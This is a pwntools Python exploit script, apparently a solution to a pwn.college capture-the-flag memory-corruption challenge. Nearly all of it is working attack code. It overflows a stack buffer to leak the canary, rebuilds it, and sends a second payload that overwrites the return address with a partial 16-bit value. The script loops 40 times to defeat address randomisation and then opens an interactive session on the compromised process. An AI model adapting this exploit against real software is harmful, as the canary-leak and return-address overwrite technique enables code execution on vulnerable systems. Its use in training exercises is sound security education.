#!/bin/python

from pwn import * 
import sys

BACKDOOR=b'REPEAT'

BUFFER_SIZE=0x58 
BUFFER_OFFSET=0x68 - 1 
RET_ADDR=0x20ee

if len(sys.argv) <= 1: 
    print('Usage: ./mem_corruption.py [PROG]')

for _ in range(40):
    proc = process(sys.argv[1])
    #    proc = gdb.debug(sys.argv[1], gdbscript="b challenge")

    payload = cyclic(BUFFER_SIZE-len(BACKDOOR)) + BACKDOOR + b'\x01'
    payload_len = len(payload)
    proc.sendline(str(payload_len).encode())
    proc.send(payload)

    proc.readuntil(BACKDOOR)
    canary = proc.readline()
    canary = b'\x00' + canary[1:8]

    print(f'\n\tCANARY: {canary}\t\n')

    payload = cyclic(BUFFER_SIZE) + canary + cyclic(8) + p16(RET_ADDR)
    proc.sendline(str(len(payload)).encode())
    proc.send(payload)

    try:
        if proc.readuntil(b'pwn.college', timeout=1) != '':
            break
    except: 
        pass

proc.interactive()
